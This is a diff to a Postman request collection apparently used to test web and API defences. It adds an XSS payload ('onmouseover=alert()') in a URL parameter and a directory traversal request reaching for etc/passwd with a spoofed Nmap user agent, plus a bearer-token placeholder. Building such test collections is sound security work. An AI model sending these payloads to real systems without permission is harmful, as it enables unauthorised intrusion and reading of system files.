@@ -1,8 +1,8 @@
 {
 	"info": {
-		"_postman_id": "ada4f380-ec5e-4fe0-92a7-a79a9477ff5d",
-		"name": "Attacks",
+		"name": "Web & API Attacks",
 		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+
 	},
 	"item": [
 		{
@@ -637,6 +637,24 @@
 					"response": []
 				},
 				{
+					"name": "XSS in Parameter II",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://{{appname}}/user=sth%22+onmouseover=%22alert()%22+id=%22xss%22+%22%ff",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"user=sth%22+onmouseover=%22alert()%22+id=%22xss%22+%22%ff"
+							]
+						}
+					},
+					"response": []
+				},
+				{
 					"name": "SQL in Parameter",
 					"request": {
 						"method": "GET",
@@ -922,6 +940,46 @@
 						}
 					},
 					"response": []
+				},
+				{
+					"name": "Slash Dot Director Traversal",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true,
+						"disabledSystemHeaders": {
+							"user-agent": true
+						}
+					},
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "User-Agent",
+								"value": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https\\://nmap.org/book/nse.html",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc",
+								"passwd"
+							]
+						}
+					},
+					"response": []
 				}
 			]
 		},
@@ -1176,6 +1234,16 @@
 			]
 		}
 	],
+	"auth": {
+		"type": "bearer",
+		"bearer": [
+			{
+				"key": "token",
+				"value": "Your.Bearer.Token.Here",
+				"type": "string"
+			}
+		]
+	},
 	"event": [
 		{
 			"listen": "prerequest",
